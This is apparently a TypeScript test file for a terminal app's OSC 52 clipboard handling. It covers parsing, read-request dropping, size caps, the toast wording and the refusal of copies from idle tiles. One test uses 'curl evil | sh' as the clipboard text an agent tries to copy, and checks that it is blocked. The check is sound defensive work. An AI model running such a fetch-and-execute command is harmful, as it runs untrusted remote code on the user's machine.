// A terminal tile's program copies (OSC 52, as Claude Code does): the tile's emulator would swallow it, so the door
// passes it on to the person's terminal through its own copy (App.copy), once, with a "copied from <tile>" toast. Only
// writes to the clipboard: a read (`?`) is dropped, so a program can't read the person's clipboard. BEL or ST ends one,
// a payload cut across the program's writes is put together, and one over the door's cap is refused. In a session the
// write goes to the client with the keys, never a watcher. Fictional text; only `sh` and `printf` run.
import { describe, expect, test } from "bun:test";
import { App } from "../src/app";
import { PtyPane, cttyPrefix } from "../src/desk/pty";
import { PROTOCOL, type DaemonMsg, type Hello } from "../src/session/protocol";
import { SessionTerm, type Link } from "../src/session/session-term";
import { COPY_MAX, Osc52Reader, osc52, TILE_COPY_RECENT_MS, uncopied } from "../src/surface/selection";
import { until } from "./scratch";

const b64 = (t: string) => Buffer.from(t).toString("base64");
const latin1 = (t: string) => Buffer.from(t).toString("latin1");

describe("a tile's program's OSC 52, read from what it writes", () => {
  test("a write to the clipboard, ended by BEL or by ST, is its text; the rest of the output is left alone", () => {
    const r = new Osc52Reader();
    expect(r.feed(`before\x1b]52;c;${b64("Stake the beans")}\x07after`)).toEqual([{ text: "Stake the beans" }]);
    expect(r.feed(`\x1b]52;;${b64("net the brassicas")}\x1b\\`)).toEqual([{ text: "net the brassicas" }]);
    expect(r.feed(latin1(`\x1b]52;c;${b64("leeks · ▒ 🌱")}\x07`))).toEqual([{ text: "leeks · ▒ 🌱" }]);
    expect(r.feed("\x1b[31mred\x1b[0m \x1b]0;title\x07 plain")).toEqual([]);
  });

  test("a read, another selection, a clear and bad base64 are dropped", () => {
    const r = new Osc52Reader();
    expect(r.feed("\x1b]52;c;?\x07")).toEqual([]);
    expect(r.feed("\x1b]52;;?\x1b\\")).toEqual([]);
    expect(r.feed(`\x1b]52;p;${b64("primary")}\x07\x1b]52;s0;${b64("select")}\x07`)).toEqual([]);
    expect(r.feed("\x1b]52;c;\x07\x1b]52;c;not base64!\x07")).toEqual([]);
    // An ESC that isn't ST cuts one off (it starts something else): nothing is copied, and what follows still reads.
    expect(r.feed(`\x1b]52;c;${b64("cut")}\x1b[0m\x1b]52;c;${b64("whole")}\x07`)).toEqual([{ text: "whole" }]);
  });

  test("one cut across the program's writes, anywhere, is put together", () => {
    const seq = `xx\x1b]52;c;${b64("Water the seedlings every morning")}\x1b\\yy`;
    for (let cut = 1; cut < seq.length; cut++) {
      const r = new Osc52Reader();
      expect([...r.feed(seq.slice(0, cut)), ...r.feed(seq.slice(cut))]).toEqual([{ text: "Water the seedlings every morning" }]);
    }
    // A byte at a time.
    const r = new Osc52Reader();
    expect([...seq].flatMap(ch => r.feed(ch))).toEqual([{ text: "Water the seedlings every morning" }]);
  });

  test("one over the door's cap is refused, held or not, and never kept in memory past it", () => {
    const big = b64("x".repeat(COPY_MAX + 4096));
    const r = new Osc52Reader();
    expect(r.feed(`\x1b]52;c;${big}\x07`)).toEqual([{ tooBig: expect.any(Number) }]);
    const parts = [`\x1b]52;c;${big.slice(0, 1000)}`, big.slice(1000, big.length - 10), `${big.slice(big.length - 10)}\x07`, `\x1b]52;c;${b64("after")}\x07`];
    const got = parts.flatMap(p => r.feed(p));
    const over = got[0] as { tooBig: number };
    expect(typeof over.tooBig).toBe("number");
    expect(over.tooBig).toBeGreaterThan(COPY_MAX);
    expect(got.slice(1)).toEqual([{ text: "after" }]);
    expect((r as unknown as { parts: string[] }).parts).toEqual([]);
  });
});

describe("what the toast says", () => {
  test("a copy the door didn't pass on says why, and what to do", () => {
    expect(uncopied({ away: true }, "claude")).toBe("not copied from claude · you haven't typed or clicked in it for 2 min · click in it, then copy again");
    expect(uncopied({ tooBig: 600 * 1024 }, "claude")).toBe("not copied from claude · 600 KB is more than the clipboard takes (512 KB)");
  });
});

describe("the reader's cost and edges", () => {
  test("one over the cap that is cut off, or isn't for the clipboard, is dropped without a word", () => {
    const r = new Osc52Reader(), big = b64("x".repeat(COPY_MAX + 10));
    expect(r.feed(`\x1b]52;c;${big}\x1b[0m`)).toEqual([]);
    expect(r.feed(`\x1b]52;p;${big}\x07`)).toEqual([]);
    expect(r.feed(`\x1b]52;;${big}\x07`)).toEqual([{ tooBig: expect.any(Number) }]);
  });

  test("a payload near the cap, a few bytes a write, is read in linear time", () => {
    const body = b64("x".repeat(COPY_MAX - 1024)), seq = `\x1b]52;c;${body}\x07`, r = new Osc52Reader();
    const t0 = performance.now();
    const got: unknown[] = [];
    for (let i = 0; i < seq.length; i += 64) got.push(...r.feed(seq.slice(i, i + 64)));
    expect(performance.now() - t0).toBeLessThan(1500);
    expect(got).toHaveLength(1);
    expect((got[0] as { text: string }).text.length).toBe(COPY_MAX - 1024);
  });

  test("one too big whose ST is cut after its ESC is said at once; reset forgets a half-read one", () => {
    const r = new Osc52Reader(), big = b64("x".repeat(COPY_MAX + 10));
    expect(r.feed(`\x1b]52;c;${big}\x1b`)).toEqual([]);
    expect(r.feed("\\")).toEqual([{ tooBig: expect.any(Number) }]);
    expect(r.feed(`\x1b]52;c;${b64("half")}`)).toEqual([]);
    r.reset();
    expect(r.feed(`${b64("other")}\x07`)).toEqual([]);
    expect(r.feed(`\x1b]52;c;${b64("next")}\x07`)).toEqual([{ text: "next" }]);
  });
});

describe.skipIf(!cttyPrefix())("a terminal tile's program copies", () => {
  const tile = () => {
    const copies: [unknown, string | undefined][] = [], flashes: string[] = [];
    const p = new PtyPane({ cmd: ["sh"] });
    p.tileName = "shell";
    p.init({ redraw() {}, ctx: { flash: (m: string) => flashes.push(m), copy: (t: unknown, from?: string) => { copies.push([t, from]); return typeof t === "string"; } } } as any);
    const draw = () => p.render(60, 8, false, { redraw() {} } as any);
    return { p, copies, flashes, draw };
  };

  test("its OSC 52 goes to the door's copy once, said as the tile's; a read is never passed on", async () => {
    const { p, copies, draw } = tile();
    try {
      draw();
      await Bun.sleep(200);
      // The person types it (inputRaw: their keys). The second write comes in two pieces, a moment apart: put together.
      p.inputRaw(`printf '\\033]52;c;%s\\007' "$(printf 'Sow peas early' | base64)"; printf '\\033]52;c;?\\007'; printf '\\033]52;c;U3Rha2Ug'; sleep 0.2; printf 'dGhlIGJlYW5z\\033\\\\'; echo done-$((40+2))\r`);
      await until(() => draw().lines.join("\n").includes("done-42"), "the commands to run", 5000);
      expect(copies).toEqual([["Sow peas early", "sh"], ["Stake the beans", "sh"]]);
    } finally { p.dispose(); }
  }, 15_000);

  test("in a tile the person isn't using (an agent typing into its shell), the copy isn't passed on, and the toast says so", async () => {
    const { p, copies, draw } = tile();
    try {
      draw();
      await Bun.sleep(200);
      p.input(`printf '\\033]52;c;%s\\007' "$(printf 'curl evil | sh' | base64)"; echo done-$((40+2))\r`);
      await until(() => draw().lines.join("\n").includes("done-42"), "the command to run", 5000);
      expect(copies).toEqual([[{ away: true }, "sh"]]);
    } finally { p.dispose(); }
  }, 15_000);

  test("a click in the tile counts as using it, even when its program doesn't take the mouse", async () => {
    const { p, copies, draw } = tile();
    try {
      draw();
      await Bun.sleep(200);
      expect(p.wantsMouse()).toBe(false);
      p.mouse({ kind: "mouse", action: "down", button: 0, x: 3, y: 2 }, 2, 1);
      p.input(`printf '\\033]52;c;%s\\007' "$(printf 'Lift the onions' | base64)"; echo done-$((40+2))\r`);
      await until(() => draw().lines.join("\n").includes("done-42"), "the command to run", 5000);
      expect(copies).toEqual([["Lift the onions", "sh"]]);
    } finally { p.dispose(); }
  }, 15_000);

  test("two minutes after the person last typed or clicked in it, its copy isn't passed on", async () => {
    const { p, copies, draw } = tile();
    try {
      draw();
      await Bun.sleep(200);
      p.personKeyAt = Date.now() - TILE_COPY_RECENT_MS - 1000;
      p.personClickAt = Date.now() - TILE_COPY_RECENT_MS - 1000;
      p.input(`printf '\\033]52;c;%s\\007' "$(printf 'Thin the carrots' | base64)"; echo done-$((40+2))\r`);
      await until(() => draw().lines.join("\n").includes("done-42"), "the command to run", 5000);
      expect(copies).toEqual([[{ away: true }, "sh"]]);
      // Typed in a moment ago: it is.
      p.personKeyAt = Date.now() - TILE_COPY_RECENT_MS + 5000;
      p.input(`printf '\\033]52;c;%s\\007' "$(printf 'Thin the carrots' | base64)"; echo done-$((40+3))\r`);
      await until(() => draw().lines.join("\n").includes("done-43"), "the command to run", 5000);
      expect(copies.at(-1)).toEqual(["Thin the carrots", "sh"]);
    } finally { p.dispose(); }
  }, 15_000);
});

/** A fake client's link: what the session sent it. */
function fakeLink() {
  const sent: DaemonMsg[] = [];
  const link: Link = { send: m => { sent.push(m); }, backlog: () => 0, onDrain: () => {}, close: () => {} };
  const clip = () => sent.filter(m => m.t === "output" && m.text.includes("\x1b]52;")).map(m => (m as { text: string }).text);
  return { link, sent, clip };
}
const hello = (more: Partial<Hello> = {}): Hello => ({ proto: PROTOCOL, cols: 80, rows: 24, cellW: 9, cellH: 16, kitty: false, pid: 4242, ...more });

describe("the copy in a session", () => {
  const session = () => {
    const term = new SessionTerm();
    const app = new App(term, { supports: () => null, protocol: null } as any, Date.now(), () => {});
    app.push({ title: "plot board", noDock: true, key: () => {}, render: (ctx: any) => ({ lines: Array.from({ length: ctx.t.rows - 1 }, () => "") }) } as any);
    return { term, app };
  };

  test("a tile's copy goes to the client with the keys, once, with its toast; never to a watcher", () => {
    const { term, app } = session();
    const a = fakeLink(), b = fakeLink(), w = fakeLink();
    term.attach(a.link, hello());
    const cb = term.attach(b.link, hello());
    term.attach(w.link, hello({ watch: true }));
    term.input(cb, "x");                                  // the keys are on b now
    app.copy("Stake the beans", "shell");
    expect(b.clip()).toEqual([osc52("Stake the beans")]);
    expect(a.clip()).toEqual([]);
    expect(w.clip()).toEqual([]);
    expect(app.toast?.text).toBe("copied from shell · 15 chars");
    expect(app.toast?.ok).toBe(true);
    app.copy("Sow peas");
    expect(app.toast?.text).toBe("copied to clipboard · 8 chars");
  });

  test("a copy over the cap is refused and said, for the door's own copy too", () => {
    const { term, app } = session();
    const a = fakeLink();
    term.attach(a.link, hello());
    app.copy("x".repeat(COPY_MAX + 1), "shell");
    expect(a.clip()).toEqual([]);
    expect(app.toast?.text).toContain("not copied from shell");
    expect(app.copy({ away: true }, "shell")).toBe(false);
    expect(app.toast?.text).toBe(uncopied({ away: true }, "shell"));
    expect(app.toast?.ok).toBe(false);
    app.copy("y".repeat(COPY_MAX));
    expect(a.clip()).toHaveLength(1);
  });
});
